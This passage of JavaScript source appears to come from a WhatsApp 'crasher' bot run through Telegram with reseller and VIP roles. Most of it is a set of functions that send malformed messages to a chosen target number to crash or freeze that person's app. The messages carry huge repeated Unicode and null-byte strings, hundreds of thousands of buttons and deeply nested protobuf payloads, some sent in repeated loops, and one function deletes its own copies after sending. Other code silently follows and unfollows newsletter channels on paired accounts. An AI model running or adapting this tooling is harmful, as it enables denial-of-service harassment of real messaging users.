            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      })
    )
  )
}

async function delayerhardinvia(sock, target) {
    const constants = {
        statusBroadcast: "status@broadcast",
        buttonText: "Click Here",
        flowName: "call_permission_request",
        accessKey: "CALL_ACCESS",
        metaTag: "meta",
        contactsTag: "contacts",
        mentionedUsersTag: "mentioned_users"
    };
    const body = { text: "XX" };
    const buttonLength = { length: 500000 };   
    const urlLength = { length: 900000 };    
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: body,
                    nativeFlowMessage: {
                        buttons: Array.from(buttonLength, () => ({}))
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, msg1, { participant: true });
    const msg2 = {
        interactiveResponseMessage: {
            body: {
                text: constants.buttonText,
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: constants.flowName,
                paramsJson: "FORM_SCREEN",
                version: 3
            },
            contextInfo: {
                remoteJid: "0.dkwzzqyl7ei" + constants.accessKey,
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from(urlLength, () => ({
                        xN0000: "Grettles"
                    }))
                }
            }
        }
    };
    const options = {
        participant: true,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: constants.metaTag,
                attrs: {
                    status_setting: constants.contactsTag
                },
                content: [
                    {
                        tag: constants.mentionedUsersTag,
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: {
                                    jid: target
                                },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    };
    await sock.relayMessage(constants.statusBroadcast, msg2, options);
}

async function xofm(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "ี".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\{".repeat(9999),
                buttons: "ี".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}

async function unknowbuts(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            },
            body: {
              text: "\x10".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    },
    {
      participant: true
    }
  );
}

async function VonixBlankClick(sock, target) {
  try {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
    
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "VONIX CROSS" + "\u200b".repeat(20000) + "\u800b".repeat(20000) + "\x20".repeat(20000) + "\u0000".repeat(20000),
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "voice_call",
                  buttonParamsJson: "\0"
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦾ".repeat(30000) + "\uD808\uDC00".repeat(5000),
                    id: "\u600b".repeat(5000) + "\u0000".repeat(5000)
                  })
                }
              ]
            }
          }
        }
      }
    };

    for (let i = 0; i < 25; i++) {
      let msg;
      try {
        msg = await generateWAMessageFromContent(jid, payload, { userJid: jid });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id + "_" + i });
      } catch {
        await sock.relayMessage(jid, payload, {});
      }
      await new Promise(r => setTimeout(r, 300));
    }
    
    console.log("✅ VONIX BLANK CLICK — Selesai terkirim ke:", jid);
  } catch (e) {
    console.error("❌ Error:", e.message);
  }
}

async function BlankFreeze(sock, target) {
  // ─── Karakter berat ────────────────────────────────
  const HEAVY = "𑇂𑆵𑆴𑆿".repeat(90000);
  const NULL_B = "\u0000".repeat(900000);

  // ─── BANGUN MSG 1 (Interactive Response) ───────────
  const msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: { text: "- # X-FORCECrashèr ん.? ", format: 1 },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: JSON.stringify({
          wa_flow_response_params: {
            title: "𑇂𑆵𑆴𑆿".repeat(90000)
          }
        }),
        version: 3
      }
    }
  }, {
    participant: { jid: target }
  });

  // ─── KIRIM 1: Interactive + Review_and_Pay ─────────
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "- # X-FORCECrashèr ん.? "
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 999999999999, offset: 100 },
              reference_id: "\u0000".repeat(9000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(90000),
                    amount: { value: 100000, offset: 100 },
                    quantity: 999999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  // ─── KIRIM 2: Sticker Pack ─────────────────────────
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "z".repeat(150000),
      publisher: "x".repeat(120000),
      stickers: [],
      fileLength: "9999999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
      packDescription: "y".repeat(90000),
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});

  // ─── KIRIM 3: Payment Info + Pix ───────────────────
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{
              "currency":"IDR",
              "total_amount":{"value":0,"offset":100},
              "reference_id":"${Date.now()}",
              "type":"physical-goods",
              "order":{
                "status":"pending",
                "subtotal":{"value":0,"offset":100},
                "order_type":"ORDER",
                "items":[{
                  "name":"${HEAVY}",
                  "amount":{"value":0,"offset":100},
                  "quantity":0,
                  "sale_amount":{"value":0,"offset":100}
                }]
              },
              "payment_settings":[{
                "type":"pix_static_code",
                "pix_static_code":{
                  "merchant_name":"MakLo",
                  "key":"${NULL_B}",
                  "key_type":"CPF"
                }
              }],
              "share_payment_status":false
            }`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function DelayInvisible(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '12345678@newsletter',
                    newsletterName: 'X-FORCE CRASHER' + 'ោ៝'.repeat(7500),
                    caption: 'X-FORCE CRASHER' + 'ោ៝'.repeat(7500),
                    inviteExpiration: Date.now() + 1814400000,
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            '0@s.whatsapp.net',
                            ...Array.from({ length: 1900 }, () =>
                                '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net'
                            )
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000
                            },
                            forwardedAiBotMessageInfo: {
                                number_999999: "DATA_MEDIA",
                                botName: 'olaa hanz',
                                botJid: Math.floor(Math.random() * 5000000) + '@s.whatsapp.net',
                                creatorName: 'Kelz is here',
                                liveLocationMessage: {
                                    degreesLatitude: -1e309,
                                    degreesLongitude: 1e309,
                                    accuracyInMeters: 999999999,
                                    speedInMps: 1,
                                    degreesClockwiseFromMagneticNorth: 999999999,
                                    caption: "\u0000".repeat(50000),
                                    sequenceNumber: 999999999,
                                    timeOffset: Date.now()
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}
async function xxx(sock, target) {
    const xxx = {
       stickerPackMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091",
         name: "\0" + "ꦾ".repeat(70000),
         publisher: "Nexi" + "ꦾ".repeat(5000),
      }
    };
    
    const kontol = {
      interactiveMessage: {
      body: {
        text: "Halo bg" + "ꦾ".repeat(30000),
      },
      nativeFlowMessage: {
        name: "carousel_message",
        buttons: [],
        cards: Array.from({ length: 30 }, () => ({})),
      },
      contextInfo: {
        remoteJid: "@s.whatsapp.net",
        statusAttributionType: 9999,
        mentionedJid: Array.from(
          { length: 2000 },
          () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
        ),
      },
    },
  };
  
    const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ stickerPackMessage: kontol, xxx })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(target) ? target : [target])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 900; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [target],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: target },
                content: []
              }]
            }]
          }]
        });
      } catch (_) {}
    }
  }
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};

function prepareAuthFolders() {
  const userId = "X-FORCE";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logSuccess("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      logWarning("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logError("Buat Folder 'X-FORCE' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}

function setupVipFolder() {
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      logSuccess("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    logError("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          logSuccess(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logSuccess(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logSuccess(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logWarning(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      logError(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logWarning(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logError(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  logSuccess('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "X-FORCE";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  logSuccess(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      logSuccess(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      logWarning("Data bukan array!");
      return;
    }

    logSuccess(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        logSuccess(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        logError(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    logSuccess("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    logError("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('X-FORCE', owner, number);

  if (!fs.existsSync('X-FORCE')) fs.mkdirSync('X-FORCE');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        logWarning(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363425160931180@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        logSuccess("✅ Auto join channel sukses");
      } catch (e) {
        logError("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('X-FORCE', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          logSuccess(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        logError(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const baseDir = 'X-FORCE';
  
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory());

  logSuccess(`[DEBUG] Found ${subfolders.length} subfolders inside X-FORCE`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      logSuccess(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        if (activeConnections[sessionName]) {
          logSuccess(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          logSuccess(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          logError(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      logError(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }  
}

function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logError("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}

function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('X-FORCE', subfolderName);

  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

const telegramDataPath = "telegram.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(
      telegramDataPath,
      JSON.stringify({
        godUser: [],
        developerUser: [],
        ownerUser: [],
        partnerUser: [],
        resellerUser: [],
        vipUser: [],       // ← TAMBAH
        userList: []
      }, null, 2)
    );
  }

  const cfg = JSON.parse(fs.readFileSync(telegramDataPath, "utf8"));
  // Migrasi otomatis kalau file lama belum punya vipUser
  if (!cfg.vipUser) {
    cfg.vipUser = [];
    saveTelegramConfig(cfg);
  }
  return cfg;
}

function saveTelegramConfig(data) {
    fs.writeFileSync(
        telegramDataPath,
        JSON.stringify(data, null, 2)
    );
}

function getTelegramRole(id) {
  const cfg = loadTelegramConfig();
  if (cfg.godUser.includes(id)) return "god";
  if (cfg.developerUser.includes(id)) return "developer";
  if (cfg.ownerUser.includes(id)) return "owner";
  if (cfg.partnerUser.includes(id)) return "partner";
  if (cfg.resellerUser.includes(id)) return "reseller";
  if (cfg.vipUser?.includes(id)) return "vip";           // ← TAMBAH
  if (cfg.userList.includes(id)) return "member";        // ← user → member
  return null;
}

function getHighestRole(id) {
  const cfg = loadTelegramConfig();
  if (cfg.godUser.includes(id)) return "god";
  if (cfg.developerUser.includes(id)) return "developer";
  if (cfg.ownerUser.includes(id)) return "owner";
  if (cfg.partnerUser.includes(id)) return "partner";
  if (cfg.resellerUser.includes(id)) return "reseller";
  if (cfg.vipUser?.includes(id)) return "vip";           // ← TAMBAH
  if (cfg.userList.includes(id)) return "member";        // ← user → member
  return "none";
}

function getTargetRoles(id) {
  const cfg = loadTelegramConfig();
  return {
    member: cfg.userList.includes(id), // ✅ FIX: Sekarang Member bisa dicentang bersamaan dengan VIP dll
    vip: cfg.vipUser?.includes(id) || false,
    user: cfg.userList.includes(id),
    reseller: cfg.resellerUser.includes(id),
    partner: cfg.partnerUser.includes(id),
    owner: cfg.ownerUser.includes(id),
    developer: cfg.developerUser.includes(id),
    god: cfg.godUser.includes(id)
  };
}

function roleKeyboard(targetId, executorId) {
  const role = getTargetRoles(targetId);
  const rows = [];
  let temp = [];

  function addButton(roleName, label, active) {
    if (!canGiveRole(executorId, roleName)) return;
    temp.push({
      text: `${active ? "✅" : "❌"} ${label}`,
      callback_data: `role:${roleName}:${targetId}`
    });
    if (temp.length === 2) { rows.push(temp); temp = []; }
  }

  addButton("member", "Member", role.member);
  addButton("vip", "VIP", role.vip);
  addButton("reseller", "Reseller", role.reseller);
  addButton("partner", "Partner", role.partner);
  addButton("owner", "Owner", role.owner);
  addButton("developer", "Developer", role.developer);

  if (temp.length) rows.push(temp);

  rows.push([{
    text: "✔ Selesai",
    callback_data: `finish:${targetId}`,
    style: "success"
  }]);

  return { inline_keyboard: rows };
}

function canUseAddRole(id) {
  const role = getTelegramRole(id);
  return [
    "god",
    "developer",
    "owner",
    "partner",
    "reseller"
    // vip & member TIDAK bisa pakai /addrole
  ].includes(role);
}

function canGiveRole(senderId, targetRole) {
  const myRole = getHighestRole(senderId);

  // God & Developer bisa kasih semua role
  if (myRole === "god" || myRole === "developer") return true;

  const permission = {
    member:    ["reseller", "partner", "owner"],
    vip:       ["partner", "owner"],
    reseller:  ["partner", "owner"],
    partner:   ["owner"],
    owner:     [],
    developer: [],
    god:       []
  };

  if (!permission[targetRole]) return false;
  return permission[targetRole].includes(myRole);
}
function generateRoleKeyboard(targetId, senderId) {
  const role = getTelegramRole(senderId);

  const roleMap = {
    member:    { label: "👤 Member",    style: "primary" },
    vip:       { label: "⭐ VIP",        style: "primary" },
    reseller:  { label: "💼 Reseller",  style: "primary" },
    partner:   { label: "🤝 Partner",   style: "primary" },
    owner:     { label: "👑 Owner",     style: "primary" },
    developer: { label: "💻 Developer", style: "primary" }
  };

  const allow = {
    god:       ["developer", "owner", "partner", "reseller", "vip", "member"],
    developer: ["owner", "partner", "reseller", "vip", "member"],
    owner:     ["partner", "reseller", "vip", "member"],
    partner:   ["reseller", "vip", "member"],
    reseller:  ["vip", "member"],
    vip:       [],
    member:    []
  };

  const allowed = allow[role] || [];
  const buttons = allowed.map(r => ([{
    text: roleMap[r].label,
    callback_data: `tgrole|${r}|${targetId}|${senderId}`,
    style: roleMap[r].style
  }]));

  return { inline_keyboard: buttons };
}

function removeAllRole(id) {
  const cfg = loadTelegramConfig();
  cfg.godUser = cfg.godUser.filter(x => x != id);
  cfg.developerUser = cfg.developerUser.filter(x => x != id);
  cfg.ownerUser = cfg.ownerUser.filter(x => x != id);
  cfg.partnerUser = cfg.partnerUser.filter(x => x != id);
  cfg.resellerUser = cfg.resellerUser.filter(x => x != id);
  if (!cfg.vipUser) cfg.vipUser = [];
  cfg.vipUser = cfg.vipUser.filter(x => x != id);        // ← TAMBAH
  cfg.userList = cfg.userList.filter(x => x != id);
  saveTelegramConfig(cfg);
}

function addRole(id, role) {
  const cfg = loadTelegramConfig();
  const map = {
    developer: "developerUser",
    owner: "ownerUser",
    partner: "partnerUser",
    reseller: "resellerUser",
    vip: "vipUser",
    member: "userList",
    user: "userList"
  };
  const key = map[role];
  if (!key) return;
  if (!cfg[key]) cfg[key] = [];
  if (!cfg[key].includes(id)) cfg[key].push(id);
  saveTelegramConfig(cfg);
}

function rolePanel(targetId, username) {
  const r = getTargetRoles(targetId);
  return `
╭━━━〔 USER ROLE 〕━━━⬣
👤 ${username || "Tidak ada username"}
🆔 ${targetId}
━━━━━━━━━━━━━━━━━━
${r.member ? "✅" : "❌"} Member
${r.vip ? "✅" : "❌"} VIP
${r.reseller ? "✅" : "❌"} Reseller
${r.partner ? "✅" : "❌"} Partner
${r.owner ? "✅" : "❌"} Owner
${r.developer ? "✅" : "❌"} Developer
━━━━━━━━━━━━━━━━━━
`;
}

bot.onText(/^\/addrole(?:\s+(.+))?$/, async (msg, match) => {

    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const bl = getBlacklist();
    
    if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

    if (!ALLOWED_GROUPS.includes(chatId)) {
        return bot.sendMessage(
            chatId,
            "❌ Command ini hanya dapat digunakan di grup utama."
        );
    }

    if (!canUseAddRole(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Kamu tidak memiliki akses menggunakan addrole."
        );
    }

    let targetId = null;
    let username = "Tidak ada username";

    // =========================
    // REPLY
    // =========================
    if (msg.reply_to_message) {

        targetId = Number(msg.reply_to_message.from.id);

        username = msg.reply_to_message.from.username
            ? `@${msg.reply_to_message.from.username}`
            : "Tidak ada username";

    }

    // =========================
    // INPUT
    // =========================
    else if (match[1]) {

        const input = match[1].trim();

        // INPUT ID
        if (/^\d+$/.test(input)) {

            targetId = Number(input);

        }

        // INPUT USERNAME
        else if (input.startsWith("@")) {

            return bot.sendMessage(
                chatId,
                "❌ Telegram Bot API tidak dapat mengubah username menjadi ID.\n\nGunakan:\n• Reply pesan user\n• /addrole <id>"
            );

        }

    }

    if (targetId === null) {

        return bot.sendMessage(
            chatId,
`❌ Format salah.

Contoh:

/addrole 123456789

atau reply pesan user lalu:

/addrole`
        );

    }

    const panel = rolePanel(targetId, username);

    const sent = await bot.sendMessage(
        chatId,
        panel,
        {
            reply_markup: roleKeyboard(
                targetId,
                senderId
            )
        }
    );

    pendingRoleMenu[senderId] = {

        target: targetId,
        username: username,
        messageId: sent.message_id,
        commandMessageId: msg.message_id,
